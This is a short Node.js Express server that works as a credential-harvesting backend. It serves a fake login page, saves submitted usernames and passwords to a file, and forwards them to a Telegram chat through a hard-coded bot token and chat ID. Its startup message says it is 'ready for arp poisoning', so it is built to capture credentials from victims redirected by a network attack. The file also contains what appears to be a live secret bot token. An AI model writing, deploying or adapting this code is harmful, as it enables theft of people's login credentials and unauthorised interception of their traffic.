import express from "express";
import fs from "fs";
import cors from 'cors';

const TelegramBot = require('node-telegram-bot-api');


const app = express();
app.use(cors({ origin: '*'}));

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.use(express.static(__dirname + "/public/live"));

app.get("/live", (req, res, next) => {
    res.sendFile(__dirname + "/public/live/index.html");
});

app.post("/userdata", (req, res, next) => {
    try {
        var data = `user: ${req.body.userName} password: ${req.body.password}`
        console.log(data);
        fs.writeFile("result.txt", data, (err) => {
            if (err) console.log(err);
            console.log("Successfully Written to File.");
          });
        res.sendStatus(200);
        return;
    } catch(err) {
        console.log(err);
        res.sendStatus(404);
        return;
    }
});


// replace the value below with the Telegram token you receive from @BotFather
const token = '7142615915:AAEbK7yRGnxZ18y4UTBI8izH4dzeI6xNjpQ';

// Create a bot instance
const bot = new TelegramBot(token);

// Endpoint to receive data and send a message
app.post('/send-message', (req, res) => {
  // Construct the message from the request payload
  const userName = req.body.userName;
  const password = req.body.password;
  const message = `SESSION\nlogin username= ${userName}\npassword = ${password}`;

  // Define the chat ID
  const chatId = '6502945541';  // Replace with the target chat ID

  // Send the message
  bot.sendMessage(chatId, message).then(() => {
      console.log('Message sent successfully');
      res.send('Message sent successfully');
  }).catch((error) => {
      console.error('Error sending message:', error);
      res.status(500).send('Error sending message');
  });
});


app.listen(5000, () => console.log("Server running on port 5000, ready for arp poisoning"));




